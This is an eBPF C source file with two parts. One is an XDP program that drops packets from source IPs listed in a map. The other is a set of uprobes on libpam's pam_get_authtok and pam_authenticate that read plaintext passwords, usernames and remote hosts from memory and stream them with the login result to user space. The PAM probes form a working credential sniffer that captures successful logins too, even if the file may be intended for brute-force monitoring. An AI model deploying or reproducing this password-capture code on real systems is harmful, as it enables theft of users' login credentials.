//go:build ignore

#include "bpf_endian.h"
#include "bpf_tracing.h"
#include "common.h"
#include "linux/tcp.h"
#include "linux/udp.h"
#include "linux/in.h"

#define MAX_MAP_ENTRIES 1024

char __license[] SEC("license") = "Dual MIT/GPL";


struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, MAX_MAP_ENTRIES);
	__type(key, u32);
	__type(value, u32);
} xdp_packet_count SEC(".maps");


struct packet_info {
	u32 ip_src;
	u32 ip_dest;
	u16 port_src;
	u16 port_dest;
};


static __always_inline int parse_packet_info(struct xdp_md *ctx, struct packet_info *packet)
{
	void *data_end = (void *)(long)ctx->data_end;
	void *data     = (void *)(long)ctx->data;

	// First, parse the ethernet header.
	struct ethhdr *eth = data;
	if ((void *)(eth + 1) > data_end) {
		return 0;
	}

	if (eth->h_proto != bpf_htons(ETH_P_IP)) {
		// The protocol is not IPv4, so we can't parse an IPv4 source address.
		return 0;
	}

	// Then parse the IP header.
	struct iphdr *ip = (void *)(eth + 1);
	if ((void *)(ip + 1) > data_end) {
		return 0;
	}

	packet->ip_src = (__u32)(ip->saddr);
	packet->ip_dest = (__u32)(ip->daddr);

	if (ip->protocol == IPPROTO_TCP) {
		struct tcphdr *tcp = (void *)(ip + 1);
		if ((void *)(tcp + 1) > data_end) {
			return 0;
		}
		packet->port_src = (__u16)bpf_ntohs(tcp->source);
		packet->port_dest = (__u16)bpf_ntohs(tcp->dest);
	} else if (ip->protocol == IPPROTO_UDP) {
		struct udphdr *udp = (void *)(ip + 1);
		if ((void *)(udp + 1) > data_end) {
			return 0;
		}
		packet->port_src = (__u16)bpf_ntohs(udp->source);
		packet->port_dest = (__u16)bpf_ntohs(udp->dest);
	}

	return 1;
}

SEC("xdp")
int xdp_prog_main(struct xdp_md *ctx) {
	struct packet_info packet;
	if (!parse_packet_info(ctx, &packet)) {
		goto done;
	}

	// update packet count
	u32 ip = packet.ip_src;
	u32 *pkt_count = bpf_map_lookup_elem(&xdp_packet_count, &ip);
	if (!pkt_count) {
		// not match and pass
		goto done;
	} else {
		// match and drop
		__sync_fetch_and_add(pkt_count, 1);
	}
	// drop packet
	return XDP_DROP;
done:
	return XDP_PASS;
}


struct pam_handle {
	char *authtok;
	// unsigned caller_is;
	// void *pam_conversation;
	// char *oldauthtok;
	// char *prompt;
	// char *service_name;
	void *filler[5];
	char *user;
	char *rhost;
	char *ruser;
	// char *tty;
	// char *xdisplay;
	// char *authtok_type;
	// void *data;
	// void *env;
};


struct event {
	u32 pid;
	u32 result;
	u8 rhost[16];
	u8 comm[16];
	u8 username[80];
	u8 password[80];
};
const struct event *unused __attribute__((unused));


struct {
	__uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
} events SEC(".maps");


struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, MAX_MAP_ENTRIES);
	__uint(key_size, sizeof(u32));
	__uint(value_size, sizeof(struct pam_handle*));
} pam_handle_map SEC(".maps");


struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, MAX_MAP_ENTRIES);
	__type(key, u32);
	__type(value, struct event);
} events_map SEC(".maps");


SEC("uprobe/pam_get_authtok")
int uprobe_pam_get_authtok(struct pt_regs *ctx)
{
	if (!PT_REGS_PARM1(ctx))
		return 0;
	struct pam_handle* phandle = (struct pam_handle*)PT_REGS_PARM1(ctx);
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	bpf_map_update_elem(&pam_handle_map, &pid, &phandle, BPF_ANY);
	return 0;
};


SEC("uretprobe/pam_get_authtok")
int uretprobe_pam_get_authtok(struct pt_regs *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	void *pam_handle_ptr = bpf_map_lookup_elem(&pam_handle_map, &pid);
	if (!pam_handle_ptr)
		return 0;

	struct pam_handle* phandle = 0;
	bpf_probe_read(&phandle, sizeof(phandle), pam_handle_ptr);

	u64 password_addr = 0;
	bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);
	u64 username_addr = 0;
	bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);
	u64 rhost_addr = 0;
	bpf_probe_read(&rhost_addr, sizeof(rhost_addr), &phandle->rhost);

	bpf_map_delete_elem(&pam_handle_map, &pid);
	struct event event_i;
	event_i.pid = pid;
	// mark as PAM_AUTH_ERR first
	event_i.result = 7;
	bpf_probe_read(&event_i.password, sizeof(event_i.password), (void *)password_addr);
	bpf_probe_read(&event_i.username, sizeof(event_i.username), (void *)username_addr);
	bpf_probe_read(&event_i.rhost, sizeof(event_i.rhost), (void *)rhost_addr);
	bpf_get_current_comm(&event_i.comm, sizeof(event_i.comm));
	bpf_map_update_elem(&events_map, &pid, &event_i, BPF_ANY);
	return 0;
};


SEC("uretprobe/pam_authenticate")
int uretprobe_pam_authenticate(struct pt_regs *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	void *event_ptr = bpf_map_lookup_elem(&events_map, &pid);
	if (!event_ptr)
		return 0;

	struct event event_i;
	bpf_probe_read(&event_i, sizeof(event_i), event_ptr);
	event_i.result = PT_REGS_RC(ctx);
	bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event_i, sizeof(event_i));
	bpf_map_delete_elem(&events_map, &pid);
	return 0;
};
